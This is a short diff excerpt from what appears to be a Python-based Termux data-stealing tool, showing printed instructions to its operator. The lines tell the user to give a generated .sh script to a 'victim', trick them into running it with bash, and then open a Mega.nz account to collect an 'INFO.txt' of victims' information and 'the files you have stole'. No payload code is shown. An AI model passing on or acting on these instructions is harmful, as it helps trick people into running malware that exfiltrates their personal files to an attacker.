@@ -71,4 +71,3 @@ print(" 2. Open your file manager and find the file named: '" + str(ChB) + ".sh'
 print(" 3. Give '" + str(ChB) + ".sh' to your victim and make your victim run the script by making him/her type this in his/her termux:\n bash " + str(ChB) + ".sh")
 print(" 4. After the victim run the script. Open your Mega.nz account.")
 print("   You will see there the file named 'INFO.txt' (INFO.txt containts infos of your victims) and the files you have stole")
-
